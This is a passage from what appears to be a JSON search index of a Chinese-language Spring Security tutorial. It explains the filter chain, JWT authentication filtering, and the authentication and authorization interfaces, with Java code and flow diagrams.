accessDeniedHandler;\n\n    @Override\n    public void doFilter(ServletRequest request, ServletResponse response, \n                        FilterChain chain) throws IOException, ServletException {\n        try {\n            chain.doFilter(request, response);\n        } catch (AuthenticationException e) {\n            // \u5904\u7406\u8ba4\u8bc1\u5f02\u5e38\uff08401\uff09\n            handleAuthenticationException(request, response, e);\n        } catch (AccessDeniedException e) {\n            // \u5904\u7406\u6388\u6743\u5f02\u5e38\uff08403\uff09\n            handleAccessDeniedException(request, response, e);\n        }\n    }\n\n    private void handleAuthenticationException(ServletRequest request,\n                                              ServletResponse response,\n                                              AuthenticationException e) \n            throws IOException, ServletException {\n        // \u4fdd\u5b58\u8bf7\u6c42\u4fe1\u606f\uff0c\u8ba4\u8bc1\u540e\u53ef\u4ee5\u91cd\u5b9a\u5411\u56de\u6765\n        requestCache.saveRequest((HttpServletRequest) request, (HttpServletResponse) response);\n\n        // \u89e6\u53d1\u8ba4\u8bc1\u5165\u53e3\u70b9\uff08\u901a\u5e38\u662f\u8df3\u8f6c\u5230\u767b\u5f55\u9875\uff09\n        authenticationEntryPoint.commence(\n            (HttpServletRequest) request, \n            (HttpServletResponse) response, \n            e\n        );\n    }\n\n    private void handleAccessDeniedException(ServletRequest request,\n                                            ServletResponse response,\n                                            AccessDeniedException e) \n            throws IOException, ServletException {\n\n        Authentication authentication = SecurityContextHolder.getContext().getAuthentication();\n\n        if (authentication == null || authentication instanceof AnonymousAuthenticationToken) {\n            // \u672a\u8ba4\u8bc1\u7528\u6237\u8bbf\u95ee\u53d7\u4fdd\u62a4\u8d44\u6e90 \u2192 \u91cd\u5b9a\u5411\u5230\u767b\u5f55\u9875\n            authenticationEntryPoint.commence(\n                (HttpServletRequest) request,\n                (HttpServletResponse) response,\n                new InsufficientAuthenticationException(\"Full authentication is required\")\n            );\n        } else {\n            // \u5df2\u8ba4\u8bc1\u4f46\u6743\u9650\u4e0d\u8db3 \u2192 403\n            accessDeniedHandler.handle(\n                (HttpServletRequest) request,\n                (HttpServletResponse) response,\n                e\n            );\n        }\n    }\n}\n</code></pre>"},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#5-filtersecurityinterceptor","title":"5. FilterSecurityInterceptor","text":"<p>\u4f5c\u7528\uff1a \u6267\u884c\u6388\u6743\u51b3\u7b56\uff0c\u68c0\u67e5\u7528\u6237\u662f\u5426\u6709\u6743\u9650\u8bbf\u95ee\u8d44\u6e90\u3002</p> <pre><code>/**\n * FilterSecurityInterceptor\u6838\u5fc3\u903b\u8f91\n */\npublic class FilterSecurityInterceptor extends AbstractSecurityInterceptor implements Filter {\n\n    private FilterInvocationSecurityMetadataSource securityMetadataSource;\n\n    @Override\n    public void doFilter(ServletRequest request, ServletResponse response, \n                        FilterChain chain) throws IOException, ServletException {\n\n        FilterInvocation fi = new FilterInvocation(request, response, chain);\n        invoke(fi);\n    }\n\n    public void invoke(FilterInvocation fi) throws IOException, ServletException {\n        // 1. \u83b7\u53d6\u8bf7\u6c42URL\u9700\u8981\u7684\u6743\u9650\u914d\u7f6e\n        Collection&lt;ConfigAttribute&gt; attributes = \n            securityMetadataSource.getAttributes(fi);\n\n        // 2. \u5982\u679c\u8be5URL\u4e0d\u9700\u8981\u6743\u9650\uff0c\u76f4\u63a5\u653e\u884c\n        if (attributes == null || attributes.isEmpty()) {\n            fi.getChain().doFilter(fi.getRequest(), fi.getResponse());\n            return;\n        }\n\n        // 3. \u83b7\u53d6\u5f53\u524d\u8ba4\u8bc1\u4fe1\u606f\n        Authentication authentication = SecurityContextHolder.getContext().getAuthentication();\n\n        // 4. \u8fdb\u884c\u6388\u6743\u51b3\u7b56\n        try {\n            this.accessDecisionManager.decide(authentication, fi, attributes);\n        } catch (AccessDeniedException e) {\n            throw e;  // \u5c06\u88abExceptionTranslationFilter\u6355\u83b7\n        }\n\n        // 5. \u6388\u6743\u901a\u8fc7\uff0c\u7ee7\u7eed\u8fc7\u6ee4\u5668\u94fe\n        fi.getChain().doFilter(fi.getRequest(), fi.getResponse());\n    }\n}\n</code></pre>"},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#_7","title":"\u81ea\u5b9a\u4e49\u8fc7\u6ee4\u5668","text":"<pre><code>/**\n * \u81ea\u5b9a\u4e49JWT\u8ba4\u8bc1\u8fc7\u6ee4\u5668\n */\npublic class JwtAuthenticationFilter extends OncePerRequestFilter {\n\n    @Autowired\n    private JwtTokenProvider tokenProvider;\n\n    @Autowired\n    private UserDetailsService userDetailsService;\n\n    @Override\n    protected void doFilterInternal(HttpServletRequest request,\n                                   HttpServletResponse response,\n                                   FilterChain filterChain) \n            throws ServletException, IOException {\n\n        try {\n            // 1. \u4ece\u8bf7\u6c42\u4e2d\u63d0\u53d6JWT Token\n            String token = extractToken(request);\n\n            // 2. \u9a8c\u8bc1Token\n            if (token != null &amp;&amp; tokenProvider.validateToken(token)) {\n\n                // 3. \u4eceToken\u83b7\u53d6\u7528\u6237\u540d\n                String username = tokenProvider.getUsername(token);\n\n                // 4. \u52a0\u8f7d\u7528\u6237\u8be6\u60c5\n                UserDetails userDetails = userDetailsService.loadUserByUsername(username);\n\n                // 5. \u521b\u5efa\u8ba4\u8bc1\u5bf9\u8c61\n                UsernamePasswordAuthenticationToken authentication = \n                    new UsernamePasswordAuthenticationToken(\n                        userDetails,\n                        null,\n                        userDetails.getAuthorities()\n                    );\n\n                authentication.setDetails(\n                    new WebAuthenticationDetailsSource().buildDetails(request)\n                );\n\n                // 6. \u8bbe\u7f6e\u5230SecurityContext\n                SecurityContextHolder.getContext().setAuthentication(authentication);\n            }\n        } catch (Exception e) {\n            logger.error(\"Could not set user authentication in security context\", e);\n        }\n\n        // 7. \u7ee7\u7eed\u8fc7\u6ee4\u5668\u94fe\n        filterChain.doFilter(request, response);\n    }\n\n    private String extractToken(HttpServletRequest request) {\n        String bearerToken = request.getHeader(\"Authorization\");\n        if (StringUtils.hasText(bearerToken) &amp;&amp; bearerToken.startsWith(\"Bearer \")) {\n            return bearerToken.substring(7);\n        }\n        return null;\n    }\n}\n\n/**\n * \u914d\u7f6e\u81ea\u5b9a\u4e49\u8fc7\u6ee4\u5668\n */\n@Configuration\n@EnableWebSecurity\npublic class SecurityConfig {\n\n    @Autowired\n    private JwtAuthenticationFilter jwtAuthenticationFilter;\n\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            .csrf().disable()\n            .authorizeHttpRequests(authz -&gt; authz\n                .requestMatchers(\"/api/auth/**\").permitAll()\n                .anyRequest().authenticated()\n            )\n            // \u5728UsernamePasswordAuthenticationFilter\u4e4b\u524d\u6dfb\u52a0JWT\u8fc7\u6ee4\u5668\n            .addFilterBefore(jwtAuthenticationFilter, \n                            UsernamePasswordAuthenticationFilter.class);\n\n        return http.build();\n    }\n}\n</code></pre>"},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#_8","title":"\u8ba4\u8bc1\u67b6\u6784","text":""},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#_9","title":"\u8ba4\u8bc1\u6d41\u7a0b","text":"<pre><code>                    attemptAuthentication()\nUsernamePasswordAuthenticationFilter\n            \u2502\n            \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502      AuthenticationManager            \u2502\n\u2502    (\u901a\u5e38\u662fProviderManager)             \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n            \u2502 authenticate()\n            \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   AuthenticationProvider (\u5faa\u73af\u5c1d\u8bd5)    \u2502\n\u2502   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502\n\u2502   \u2502 DaoAuthenticationProvider       \u2502 \u2502\n\u2502   \u2502  \u251c\u2500 UserDetailsService          \u2502 \u2502\n\u2502   \u2502  \u2514\u2500 PasswordEncoder             \u2502 \u2502\n\u2502   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502\n\u2502   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502\n\u2502   \u2502 LdapAuthenticationProvider      \u2502 \u2502\n\u2502   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502\n\u2502   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502\n\u2502   \u2502 CustomAuthenticationProvider    \u2502 \u2502\n\u2502   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n            \u2502\n            \u25bc \u8fd4\u56deAuthentication (\u5df2\u8ba4\u8bc1)\nSecurityContextHolder.setContext()\n</code></pre>"},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#_10","title":"\u6838\u5fc3\u63a5\u53e3","text":""},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#1-authentication","title":"1. Authentication","text":"<p>\u8868\u793a\u8ba4\u8bc1\u4fe1\u606f\u7684\u63a5\u53e3\u3002</p> <pre><code>/**\n * Authentication\u63a5\u53e3\n */\npublic interface Authentication extends Principal, Serializable {\n\n    /**\n     * \u6743\u9650\u96c6\u5408\n     */\n    Collection&lt;? extends GrantedAuthority&gt; getAuthorities();\n\n    /**\n     * \u51ed\u8bc1\uff08\u901a\u5e38\u662f\u5bc6\u7801\uff09\n     * \u8ba4\u8bc1\u540e\u901a\u5e38\u4f1a\u88ab\u6e05\u9664\n     */\n    Object getCredentials();\n\n    /**\n     * \u8be6\u7ec6\u4fe1\u606f\uff08\u5982IP\u5730\u5740\u3001Session ID\uff09\n     */\n    Object getDetails();\n\n    /**\n     * \u8eab\u4efd\u4fe1\u606f\uff08\u901a\u5e38\u662fUserDetails\u5bf9\u8c61\u6216\u7528\u6237\u540d\uff09\n     */\n    Object getPrincipal();\n\n    /**\n     * \u662f\u5426\u5df2\u8ba4\u8bc1\n     */\n    boolean isAuthenticated();\n\n    /**\n     * \u8bbe\u7f6e\u8ba4\u8bc1\u72b6\u6001\n     */\n    void setAuthenticated(boolean isAuthenticated) throws IllegalArgumentException;\n}\n</code></pre> <p>\u5e38\u7528\u5b9e\u73b0\u7c7b\uff1a</p> <pre><code>// 1. UsernamePasswordAuthenticationToken\nUsernamePasswordAuthenticationToken token = \n    new UsernamePasswordAuthenticationToken(\n        username,      // principal\n        password,      // credentials\n        authorities    // authorities (\u8ba4\u8bc1\u540e\u8bbe\u7f6e)\n    );\n\n// 2. AnonymousAuthenticationToken\nAnonymousAuthenticationToken anonymous = \n    new AnonymousAuthenticationToken(\n        \"key\",\n        \"anonymousUser\",\n        Collections.singletonList(new SimpleGrantedAuthority(\"ROLE_ANONYMOUS\"))\n    );\n\n// 3. RememberMeAuthenticationToken\nRememberMeAuthenticationToken rememberMe = \n    new RememberMeAuthenticationToken(\n        \"key\",\n        userDetails,\n        authorities\n    );\n</code></pre>"},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#2-authenticationmanager","title":"2. AuthenticationManager","text":"<p>\u8ba4\u8bc1\u7ba1\u7406\u5668\u63a5\u53e3\uff0c\u8d1f\u8d23\u534f\u8c03\u8ba4\u8bc1\u8fc7\u7a0b\u3002</p> <pre><code>/**\n * AuthenticationManager\u63a5\u53e3\n */\npublic interface AuthenticationManager {\n\n    /**\n     * \u6267\u884c\u8ba4\u8bc1\n     * @param authentication \u672a\u8ba4\u8bc1\u7684Authentication\u5bf9\u8c61\n     * @return \u5df2\u8ba4\u8bc1\u7684Authentication\u5bf9\u8c61\n     * @throws AuthenticationException \u8ba4\u8bc1\u5931\u8d25\n     */\n    Authentication authenticate(Authentication authentication) \n        throws AuthenticationException;\n}\n</code></pre> <p>\u4e3b\u8981\u5b9e\u73b0\uff1aProviderManager</p> <pre><code>/**\n * ProviderManager\u7b80\u5316\u5b9e\u73b0\n */\npublic class ProviderManager implements AuthenticationManager {\n\n    private List&lt;AuthenticationProvider&gt; providers;\n    private AuthenticationManager parent;\n\n    @Override\n    public Authentication authenticate(Authentication authentication) \n            throws AuthenticationException {\n\n        Class&lt;? extends Authentication&gt; toTest = authentication.getClass();\n        AuthenticationException lastException = null;\n\n        // \u904d\u5386\u6240\u6709Provider\n        for (AuthenticationProvider provider : providers) {\n\n            // \u68c0\u67e5Provider\u662f\u5426\u652f\u6301\u8be5\u7c7b\u578b\u7684Authentication\n            if (!provider.supports(toTest)) {\n                continue;\n            }\n\n            try {\n                // \u5c1d\u8bd5\u8ba4\u8bc1\n                Authentication result = provider.authenticate(authentication);\n\n                if (result != null) {\n                    // \u8ba4\u8bc1\u6210\u529f\n                    copyDetails(authentication, result);\n                    return result;\n                }\n            } catch (AuthenticationException e) {\n                lastException = e;\n            }\n        }\n\n        // \u5982\u679c\u6709\u7236AuthenticationManager\uff0c\u59d4\u6258\u7ed9\u7236\n        if (parent != null) {\n            try {\n                return parent.authenticate(authentication);\n            } catch (AuthenticationException e) {\n                lastException = e;\n            }\n        }\n\n        // \u6240\u6709Provider\u90fd\u65e0\u6cd5\u8ba4\u8bc1\n        if (lastException != null) {\n            throw lastException;\n        }\n\n        throw new ProviderNotFoundException(\"No AuthenticationProvider found\");\n    }\n}\n</code></pre>"},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#3-authenticationprovider","title":"3. AuthenticationProvider","text":"<p>\u5177\u4f53\u7684\u8ba4\u8bc1\u63d0\u4f9b\u8005\u3002</p> <pre><code>/**\n * AuthenticationProvider\u63a5\u53e3\n */\npublic interface AuthenticationProvider {\n\n    /**\n     * \u6267\u884c\u8ba4\u8bc1\n     */\n    Authentication authenticate(Authentication authentication) \n        throws AuthenticationException;\n\n    /**\n     * \u662f\u5426\u652f\u6301\u8be5\u7c7b\u578b\u7684Authentication\n     */\n    boolean supports(Class&lt;?&gt; authentication);\n}\n</code></pre> <p>DaoAuthenticationProvider\uff08\u6700\u5e38\u7528\uff09\uff1a</p> <pre><code>/**\n * DaoAuthenticationProvider\u7b80\u5316\u5b9e\u73b0\n */\npublic class DaoAuthenticationProvider extends AbstractUserDetailsAuthenticationProvider {\n\n    private PasswordEncoder passwordEncoder;\n    private UserDetailsService userDetailsService;\n\n    @Override\n    protected void additionalAuthenticationChecks(UserDetails userDetails,\n                                                 UsernamePasswordAuthenticationToken authentication) \n            throws AuthenticationException {\n\n        // 1. \u68c0\u67e5\u5bc6\u7801\u662f\u5426\u4e3a\u7a7a\n        if (authentication.getCredentials() == null) {\n            throw new BadCredentialsException(\"Credentials cannot be null\");\n        }\n\n        String presentedPassword = authentication.getCredentials().toString();\n\n        // 2. \u9a8c\u8bc1\u5bc6\u7801\n        if (!passwordEncoder.matches(presentedPassword, userDetails.getPassword())) {\n            throw new BadCredentialsException(\"Bad credentials\");\n        }\n    }\n\n    @Override\n    protected UserDetails retrieveUser(String username,\n                                      UsernamePasswordAuthenticationToken authentication) \n            throws AuthenticationException {\n\n        try {\n            // \u4eceUserDetailsService\u52a0\u8f7d\u7528\u6237\n            UserDetails loadedUser = userDetailsService.loadUserByUsername(username);\n\n            if (loadedUser == null) {\n                throw new InternalAuthenticationServiceException(\n                    \"UserDetailsService returned null\");\n            }\n\n            return loadedUser;\n        } catch (UsernameNotFoundException e) {\n            throw e;\n        } catch (Exception e) {\n            throw new InternalAuthenticationServiceException(e.getMessage(), e);\n        }\n    }\n}\n</code></pre>"},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#4-userdetailsservice","title":"4. UserDetailsService","text":"<p>\u52a0\u8f7d\u7528\u6237\u7279\u5b9a\u6570\u636e\u7684\u6838\u5fc3\u63a5\u53e3\u3002</p> <pre><code>/**\n * UserDetailsService\u63a5\u53e3\n */\npublic interface UserDetailsService {\n\n    /**\n     * \u6839\u636e\u7528\u6237\u540d\u52a0\u8f7d\u7528\u6237\u4fe1\u606f\n     */\n    UserDetails loadUserByUsername(String username) throws UsernameNotFoundException;\n}\n</code></pre> <p>\u5b9e\u73b0\u793a\u4f8b\uff1a</p> <pre><code>/**\n * \u81ea\u5b9a\u4e49UserDetailsService\u5b9e\u73b0\n */\n@Service\npublic class CustomUserDetailsService implements UserDetailsService {\n\n    @Autowired\n    private UserRepository userRepository;\n\n    @Override\n    @Transactional(readOnly = true)\n    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {\n\n        // 1. \u4ece\u6570\u636e\u5e93\u67e5\u8be2\u7528\u6237\n        User user = userRepository.findByUsername(username)\n            .orElseThrow(() -&gt; new UsernameNotFoundException(\"\u7528\u6237\u4e0d\u5b58\u5728: \" + username));\n\n        // 2. \u8f6c\u6362\u4e3aSpring Security\u7684UserDetails\n        return org.springframework.security.core.userdetails.User.builder()\n            .username(user.getUsername())\n            .password(user.getPassword())\n            .authorities(getAuthorities(user))\n            .accountExpired(user.isAccountExpired())\n            .accountLocked(user.isAccountLocked())\n            .credentialsExpired(user.isCredentialsExpired())\n            .disabled(!user.isEnabled())\n            .build();\n    }\n\n    private Collection&lt;? extends GrantedAuthority&gt; getAuthorities(User user) {\n        Set&lt;GrantedAuthority&gt; authorities = new HashSet&lt;&gt;();\n\n        // \u6dfb\u52a0\u89d2\u8272\uff08\u6ce8\u610f\uff1a\u89d2\u8272\u9700\u8981ROLE_\u524d\u7f00\uff09\n        user.getRoles().forEach(role -&gt; \n            authorities.add(new SimpleGrantedAuthority(\"ROLE_\" + role.getName()))\n        );\n\n        // \u6dfb\u52a0\u6743\u9650\n        user.getPermissions().forEach(permission -&gt; \n            authorities.add(new SimpleGrantedAuthority(permission.getName()))\n        );\n\n        return authorities;\n    }\n}\n</code></pre>"},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#5-userdetails","title":"5. UserDetails","text":"<p>\u6838\u5fc3\u7528\u6237\u4fe1\u606f\u63a5\u53e3\u3002</p> <pre><code>/**\n * UserDetails\u63a5\u53e3\n */\npublic interface UserDetails extends Serializable {\n\n    /**\n     * \u6743\u9650\u96c6\u5408\n     */\n    Collection&lt;? extends GrantedAuthority&gt; getAuthorities();\n\n    /**\n     * \u5bc6\u7801\n     */\n    String getPassword();\n\n    /**\n     * \u7528\u6237\u540d\n     */\n    String getUsername();\n\n    /**\n     * \u8d26\u6237\u662f\u5426\u672a\u8fc7\u671f\n     */\n    boolean isAccountNonExpired();\n\n    /**\n     * \u8d26\u6237\u662f\u5426\u672a\u9501\u5b9a\n     */\n    boolean isAccountNonLocked();\n\n    /**\n     * \u51ed\u8bc1\u662f\u5426\u672a\u8fc7\u671f\n     */\n    boolean isCredentialsNonExpired();\n\n    /**\n     * \u8d26\u6237\u662f\u5426\u53ef\u7528\n     */\n    boolean isEnabled();\n}\n</code></pre> <p>\u81ea\u5b9a\u4e49UserDetails\u5b9e\u73b0\uff1a</p> <pre><code>/**\n * \u81ea\u5b9a\u4e49UserDetails\u5b9e\u73b0\n */\npublic class CustomUserDetails implements UserDetails {\n\n    private final Long id;\n    private final String username;\n    private final String password;\n    private final String email;\n    private final boolean enabled;\n    private final boolean accountNonExpired;\n    private final boolean credentialsNonExpired;\n    private final boolean accountNonLocked;\n    private final Collection&lt;? extends GrantedAuthority&gt; authorities;\n\n    public CustomUserDetails(User user) {\n        this.id = user.getId();\n        this.username = user.getUsername();\n        this.password = user.getPassword();\n        this.email = user.getEmail();\n        this.enabled = user.isEnabled();\n        this.accountNonExpired = !user.isAccountExpired();\n        this.credentialsNonExpired = !user.isCredentialsExpired();\n        this.accountNonLocked = !user.isAccountLocked();\n        this.authorities = mapAuthorities(user.getRoles());\n    }\n\n    private Collection&lt;? extends GrantedAuthority&gt; mapAuthorities(Set&lt;Role&gt; roles) {\n        return roles.stream()\n            .map(role -&gt; new SimpleGrantedAuthority(\"ROLE_\" + role.getName()))\n            .collect(Collectors.toList());\n    }\n\n    // Getter\u65b9\u6cd5\n    public Long getId() {\n        return id;\n    }\n\n    public String getEmail() {\n        return email;\n    }\n\n    @Override\n    public Collection&lt;? extends GrantedAuthority&gt; getAuthorities() {\n        return authorities;\n    }\n\n    @Override\n    public String getPassword() {\n        return password;\n    }\n\n    @Override\n    public String getUsername() {\n        return username;\n    }\n\n    @Override\n    public boolean isAccountNonExpired() {\n        return accountNonExpired;\n    }\n\n    @Override\n    public boolean isAccountNonLocked() {\n        return accountNonLocked;\n    }\n\n    @Override\n    public boolean isCredentialsNonExpired() {\n        return credentialsNonExpired;\n    }\n\n    @Override\n    public boolean isEnabled() {\n        return enabled;\n    }\n}\n</code></pre>"},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#6-passwordencoder","title":"6. PasswordEncoder","text":"<p>\u5bc6\u7801\u7f16\u7801\u5668\u63a5\u53e3\u3002</p> <pre><code>/**\n * PasswordEncoder\u63a5\u53e3\n */\npublic interface PasswordEncoder {\n\n    /**\n     * \u7f16\u7801\u539f\u59cb\u5bc6\u7801\n     */\n    String encode(CharSequence rawPassword);\n\n    /**\n     * \u9a8c\u8bc1\u539f\u59cb\u5bc6\u7801\u4e0e\u7f16\u7801\u5bc6\u7801\u662f\u5426\u5339\u914d\n     */\n    boolean matches(CharSequence rawPassword, String encodedPassword);\n\n    /**\n     * \u662f\u5426\u9700\u8981\u91cd\u65b0\u7f16\u7801\uff08\u53ef\u9009\uff0c\u7528\u4e8e\u5347\u7ea7\u52a0\u5bc6\u7b97\u6cd5\uff09\n     */\n    default boolean upgradeEncoding(String encodedPassword) {\n        return false;\n    }\n}\n</code></pre> <p>\u5e38\u7528\u5b9e\u73b0\uff1a</p> <pre><code>/**\n * PasswordEncoder\u914d\u7f6e\n */\n@Configuration\npublic class PasswordEncoderConfig {\n\n    /**\n     * BCrypt\u7f16\u7801\u5668\uff08\u63a8\u8350\uff09\n     */\n    @Bean\n    public PasswordEncoder passwordEncoder() {\n        return new BCryptPasswordEncoder(12);  // strength: 12\n    }\n\n    /**\n     * \u59d4\u6258\u5bc6\u7801\u7f16\u7801\u5668\uff08\u652f\u6301\u591a\u79cd\u7b97\u6cd5\uff09\n     */\n    @Bean\n    public PasswordEncoder delegatingPasswordEncoder() {\n        String encodingId = \"bcrypt\";\n        Map&lt;String, PasswordEncoder&gt; encoders = new HashMap&lt;&gt;();\n        encoders.put(encodingId, new BCryptPasswordEncoder());\n        encoders.put(\"pbkdf2\", new Pbkdf2PasswordEncoder());\n        encoders.put(\"scrypt\", new SCryptPasswordEncoder());\n        encoders.put(\"argon2\", new Argon2PasswordEncoder());\n\n        return new DelegatingPasswordEncoder(encodingId, encoders);\n    }\n}\n\n/**\n * \u4f7f\u7528\u793a\u4f8b\n */\n@Service\npublic class UserService {\n\n    @Autowired\n    private PasswordEncoder passwordEncoder;\n\n    public void createUser(String username, String rawPassword) {\n        // \u52a0\u5bc6\u5bc6\u7801\n        String encodedPassword = passwordEncoder.encode(rawPassword);\n        // \u5b58\u50a8\u5230\u6570\u636e\u5e93: {bcrypt}$2a$12$...\n\n        // \u9a8c\u8bc1\u5bc6\u7801\n        boolean matches = passwordEncoder.matches(rawPassword, encodedPassword);\n    }\n}\n</code></pre>"},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#_11","title":"\u6388\u6743\u67b6\u6784","text":""},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#_12","title":"\u6388\u6743\u6d41\u7a0b","text":"<pre><code>FilterSecurityInterceptor\n        \u2502\n        \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  SecurityMetadataSource               \u2502\n\u2502  \u83b7\u53d6\u8bbf\u95ee\u8d44\u6e90\u6240\u9700\u7684\u6743\u9650\u914d\u7f6e             \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n            \u2502\n            \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  AccessDecisionManager                \u2502\n\u2502  \u51b3\u5b9a\u662f\u5426\u6388\u6743\u8bbf\u95ee                      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n            \u2502\n            \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  AccessDecisionVoter (\u6295\u7968\u5668)         \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502\n\u2502  \u2502 RoleVoter                       \u2502 \u2502\n\u2502  \u2502 AuthenticatedVoter              \u2502 \u2502\n\u2502  \u2502 WebExpressionVoter              \u2502 \u2502\n\u2502  \u2502 Custom Voter                    \u2502 \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n            \u2502\n            \u25bc\n      ACCESS_GRANTED / 